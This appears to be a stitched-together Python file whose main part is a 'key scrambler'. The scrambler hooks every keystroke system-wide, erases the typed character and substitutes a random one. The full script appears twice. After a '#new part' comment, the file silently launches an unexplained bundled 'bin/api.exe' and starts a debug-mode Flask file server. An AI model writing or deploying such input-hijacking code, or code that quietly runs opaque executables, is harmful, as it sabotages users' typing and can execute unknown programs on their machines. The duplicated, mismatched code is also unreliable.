import random
import string
import time
import keyboard  # type: ignore # Install via pip if not already installed
import threading

# A function to scramble a key (letters, numbers, punctuation, and whitespace)
def scramble_key(key):
    # If the key is alphabetic, numeric, or a punctuation mark, scramble it
    if len(key) == 1:
        # Scramble letters (A-Z, a-z) to letters, numbers, punctuation, or whitespace
        if key.isalpha():
            return random.choice(string.ascii_letters + string.digits + string.punctuation + string.whitespace)
        
        # Scramble numbers (0-9) to letters, numbers, punctuation, or whitespace
        elif key.isdigit():
            return random.choice(string.ascii_letters + string.digits + string.punctuation + string.whitespace)
        
        # Scramble punctuation or whitespace to any other valid character
        elif key in string.punctuation + string.whitespace:
            return random.choice(string.ascii_letters + string.digits + string.punctuation + string.whitespace)
    
    return key  # Return non-scrambled key (e.g., special keys like 'esc')

# A function to scramble keys periodically (every 4 seconds)
def scramble_keys_periodically():
    while True:
        time.sleep(4)  # Wait for 4 seconds
        key_to_scramble = random.choice(string.ascii_letters + string.digits + string.punctuation + ' ')
        scrambled_key = scramble_key(key_to_scramble)
        print(f"Scrambled key: {scrambled_key}")

# Main function that listens for key events and simulates the scrambled key press
def key_scrambler():
    print("Key Scrambler is running... Press ESC to stop.")
    
    # Start the thread for periodic scrambling
    thread = threading.Thread(target=scramble_keys_periodically)
    thread.daemon = True
    thread.start()
    
    while True:
        event = keyboard.read_event()
        
        # Scramble the key when a key is pressed
        if event.event_type == keyboard.KEY_DOWN and event.name != 'esc':
            scrambled_key = scramble_key(event.name)
            
            if len(scrambled_key) == 1:  # We want to simulate only if it's a valid key (not special keys)
                print(f"Original: {event.name}, Scrambled: {scrambled_key}")
                
                # Simulate pressing backspace to delete the original character
                keyboard.press_and_release('backspace')
                
                # Simulate typing the scrambled key instead of the original
                keyboard.write(scrambled_key)  # Simulates pressing the scrambled key
            
        # Exit condition: Press ESC to stop
        if event.event_type == keyboard.KEY_DOWN and event.name == 'esc':
            break

if __name__ == "__main__":
    key_scrambler()
import random
import string
import time
import keyboard  # type: ignore # Install via pip if not already installed
import threading

# A function to scramble a key (letters, numbers, punctuation, and whitespace)
def scramble_key(key):
    # If the key is alphabetic, numeric, or a punctuation mark, scramble it
    if len(key) == 1:
        # Scramble letters (A-Z, a-z) to letters, numbers, punctuation, or whitespace
        if key.isalpha():
            return random.choice(string.ascii_letters + string.digits + string.punctuation + string.whitespace)
        
        # Scramble numbers (0-9) to letters, numbers, punctuation, or whitespace
        elif key.isdigit():
            return random.choice(string.ascii_letters + string.digits + string.punctuation + string.whitespace)
        
        # Scramble punctuation or whitespace to any other valid character
        elif key in string.punctuation + string.whitespace:
            return random.choice(string.ascii_letters + string.digits + string.punctuation + string.whitespace)
    
    return key  # Return non-scrambled key (e.g., special keys like 'esc')

# A function to scramble keys periodically (every 4 seconds)
def scramble_keys_periodically():
    while True:
        time.sleep(4)  # Wait for 4 seconds
        key_to_scramble = random.choice(string.ascii_letters + string.digits + string.punctuation + ' ')
        scrambled_key = scramble_key(key_to_scramble)
        print(f"Scrambled key: {scrambled_key}")

# Main function that listens for key events and simulates the scrambled key press
def key_scrambler():
    print("Key Scrambler is running... Press ESC to stop.")
    
    # Start the thread for periodic scrambling
    thread = threading.Thread(target=scramble_keys_periodically)
    thread.daemon = True
    thread.start()
    
    while True:
        event = keyboard.read_event()
        
        # Scramble the key when a key is pressed
        if event.event_type == keyboard.KEY_DOWN and event.name != 'esc':
            scrambled_key = scramble_key(event.name)
            
            if len(scrambled_key) == 1:  # We want to simulate only if it's a valid key (not special keys)
                print(f"Original: {event.name}, Scrambled: {scrambled_key}")
                
                # Simulate pressing backspace to delete the original character
                keyboard.press_and_release('backspace')
                
                # Simulate typing the scrambled key instead of the original
                keyboard.write(scrambled_key)  # Simulates pressing the scrambled key
            
        # Exit condition: Press ESC to stop
        if event.event_type == keyboard.KEY_DOWN and event.name == 'esc':
            break

if __name__ == "__main__":
    key_scrambler()
 
 #new part

 
import subprocess
import os

# Define the path to the executable
exe_path = os.path.join(os.path.dirname(__file__), 'bin', 'api.exe')

# Run the .exe file
subprocess.run([exe_path], check=True)

from flask import Flask, send_from_directory # type: ignore

app = Flask(__name__)

@app.route('/static/<filename>')
def send_file(filename):
    return send_from_directory('static', filename)

if __name__ == "__main__":
    app.run(debug=True)
